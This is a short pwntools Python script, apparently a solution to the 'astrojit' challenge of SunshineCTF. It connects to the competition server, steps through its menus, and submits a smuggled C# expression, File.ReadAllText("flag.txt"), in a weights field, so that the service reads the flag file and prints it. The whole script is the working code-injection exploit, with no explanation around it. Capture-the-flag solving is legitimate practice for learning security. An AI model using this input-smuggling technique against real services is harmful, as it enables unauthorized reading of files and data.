from pwn import *
p = remote("astrojit.sunshinectf.games", 25006)
p.sendlineafter(b"mode: ", b"")
p.sendlineafter(b"option: ", b"1")
p.sendlineafter(b"eights:", b'{"123", File.ReadAllText("flag.txt")}')
p.sendlineafter(b"option: ", b"4")
p.recvuntil(b"b uses weight ")
print(p.recvline().strip())
